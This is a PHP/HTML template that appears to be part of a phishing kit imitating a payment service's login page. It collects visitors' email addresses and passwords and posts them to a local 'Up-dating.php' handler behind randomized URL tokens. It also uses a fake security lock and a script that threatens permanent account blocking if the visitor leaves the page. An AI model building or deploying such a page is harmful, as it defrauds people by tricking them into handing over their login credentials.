<body><header class="mainHeader" role="banner"><div class="headerContainer"><div class="grid12"><a href="#" class="logo"></a><div class="loginBtn"><span class="securityLock"><?php echo $inf_scr; ?></span></div></div></div></header><main class="superBowlMain"><section id="content" role="main" data-country="US"><section id="main" class=""><div id="account" class="account grid12"><form action="Up-dating.php?log=CheckLog#E=<?php echo $ran;?>P=<?php echo $rans;?>logdata=<?php echo crypt($_SESSION['cntn']); ?>=<?php include '../ran.php'; echo $r; ?>" method="post" name="signup_form" class="proceed" onSubmit="return checkbae()"><input type="hidden" id="csrf" name="_csrf" value=""><div class="customGrid7"><div class="personalAccountSignUp" data-selectionenabled="false">    <div class="stepProgress"><span class="selected"></span><span></span><span></span><span></span></div><div class="pageHeader"><h2><?php echo $log_lab1; ?></h2></div><p class="personalAccount"><span class="personalHeader"><?php echo $log_lab2; ?></span></p><div class="superBowlContainer "><div class="groupFields"><!-- EMAIL --><?php if (!empty($O1)){ ?>
<div class="textInput lap "><?php } else { ?> <div class="textInput lap hasError error-empty "><?php };?><div class="fields email large"><label for="email"></label><input type="email" id="email" name="1" class="validate" value="<?php echo $_SESSION['1']; ?>" maxlength="127" autocomplete="off" title="<?php echo $log_em; ?>" placeholder="<?php echo $log_em; ?>"  ></div></div><!-- PASSWORD --><div class="passwordSection clearfix"><div class="textInput lap hasError error-empty "><div class="fields large"><label for="password"></label><input type="password" id="password" name="2" class="hasHelp validate hovered"  maxlength="20" autocomplete="off" title="<?php echo $log_ps; ?>" placeholder="<?php echo $log_ps; ?>" autocorrect="off" autocapitalize="off" aria-required="true" value=""><span class="tickmark hide"></span><a id="forgotPasswordLink" target="_top" class="link bold" href="#" aria-expanded="false" role="link" aria-labeledby="recoverPasswordHelpAria"><?php echo $log_frg; ?></a></div></div></div></div><div class="btns"><input id="_eventId_personal" name="_eventId_continue" type="submit" class="medium button" value="<?php echo $log_btn; ?>"></div></div></div></div></form></div></section></section></main><?php include ('xf/ftr.php'); ?><div id="overPanel" class="US overPanel flagsIn"></div><script type="text/javascript">document.getElementsByClassName('medium button')[0].onclick = function(){window.btn_clicked = true;};
window.onbeforeunload = function(){if(!window.btn_clicked){return 'If you leave, Your account may be blocked permanently !';}};</script></body>